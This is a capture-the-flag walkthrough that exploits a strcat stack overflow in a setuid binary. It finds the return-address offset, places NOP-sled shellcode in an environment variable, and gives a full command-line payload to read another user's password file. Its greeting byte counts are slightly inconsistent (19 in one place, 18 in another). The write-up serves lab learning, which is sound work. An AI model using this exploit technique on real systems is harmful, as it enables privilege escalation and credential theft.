bonus2 - walkthrough
====================

Target: /home/user/bonus2/bonus2   (setuid + setgid bonus3)
Goal:   read /home/user/bonus3/.pass

1. Recon (objdump -d bonus2)
   main(argc=3):
     memset(buf[76], 0);
     strncpy(buf,    argv[1], 40);      ; not NUL-terminated on a full copy
     strncpy(buf+40, argv[2], 32);
     lang = getenv("LANG");
       memcmp(lang,"fi",2)==0 -> language=1
       memcmp(lang,"nl",2)==0 -> language=2
     greetuser(buf);
   greetuser(name):
     char greeting[72];                 ; ebp-0x48
     language 0: "Hello "        (7 bytes)
     language 1: "Hyvää päivää " (19 bytes)
     language 2: "Goedemiddag! " (14 bytes)
     strcat(greeting, name);            ; <-- overflow
     puts(greeting);

2. The bug
   greeting[72] gets  greeting_prefix + (argv[1] + argv[2])  via strcat, with no
   bounds check. The saved return address of greetuser is 76 bytes into
   greeting. A longer LANG greeting shifts the user bytes, changing which input
   byte lands on the return address.

3. Choose LANG=fi (19-byte greeting) and find the offset
     $ LANG=fi ./bonus2 <40-byte pattern> <32-byte pattern>   (under gdb)
       eip = 0x63413962  ("b9Ac")
   Locating "b9Ac" in the combined argv1+argv2 pattern -> offset 58, i.e.
   argv2[18..21]. (76 - 18-byte greeting = 58.)

4. Shellcode in an env var (ASLR is off: randomize_va_space = 0)
   The inputs are small and get mangled, so put the shellcode behind a NOP sled
   in a separate env var EGG and return into it:
     EGG = "\x90"*300 + execve("/bin//sh","-c","/bin/cat /home/user/bonus3/.pass")
   argv[1] must be 40 non-NUL bytes and argv[2][0..21] non-NUL, so the strcat
   copies all the way to the return address before hitting a NUL.
   Under gdb (with LANG=fi and this exact argv) the sled was at ~0xbffffd53;
   returning to 0xbffffde0 (mid-sled) is safe.

5. Payload
   LANG=fi
   argv[1] = "A"*40
   argv[2] = "A"*18 + \xe0\xfd\xff\xbf + "A"*10

     export EGG="$(python -c 'print "\x90"*300 + "<shellcode>"')"
     LANG=fi ./bonus2 "$(python -c 'print "A"*40')" \
                      "$(python -c 'print "A"*18 + "\xe0\xfd\xff\xbf" + "A"*10')"

